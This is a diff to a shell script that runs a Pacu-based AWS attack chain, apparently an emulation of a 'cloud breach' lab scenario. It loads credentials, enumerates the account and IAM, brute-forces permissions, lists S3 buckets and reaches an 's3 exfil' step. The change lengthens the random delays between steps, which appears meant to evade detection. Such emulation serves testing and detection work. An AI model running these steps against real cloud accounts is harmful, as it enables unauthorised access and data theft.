@@ -37,38 +37,38 @@ fi
 ../pacu/cli.py --session cloud_breach_s3 --set-keys cloud_breach,$AWS_ACCESS_KEY_ID,$AWS_SECRET_ACCESS_KEY,$AWS_SESSION_TOKEN
 ../pacu/cli.py --session cloud_breach_s3 --whoami
 
-timer=${RANDOM:0:1}
+timer=${RANDOM:0:3}
 echo $(date -u)
 sleep $timer
 echo 'execute aws__enum_account'
 ../pacu/cli.py --session cloud_breach_s3 --exec --module-name aws__enum_account
 
-timer=${RANDOM:0:1}
+timer=${RANDOM:0:3}
 echo $(date -u)
 sleep $timer
 echo 'execute iam__enum_permissions'
 ../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__enum_permissions
 
-timer=${RANDOM:0:1}
+timer=${RANDOM:0:3}
 echo $(date -u)
 sleep $timer
 echo 'execute iam__enum_users_roles_policies_groups'
 ../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__enum_users_roles_policies_groups
 
-timer=${RANDOM:0:1}
+timer=${RANDOM:0:3}
 echo $(date -u)
 sleep $timer
 echo 'execute iam__bruteforce_permissions'
 ../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__bruteforce_permissions
 
 
-timer=${RANDOM:0:1}
+timer=${RANDOM:0:3}
 echo $(date -u)
 sleep $timer
 echo 'execute s3 discovery'
 aws s3 ls
 
-timer=${RANDOM:0:1}
+timer=${RANDOM:0:3}
 echo $(date -u)
 sleep $timer
 echo 'execute s3 exfil'
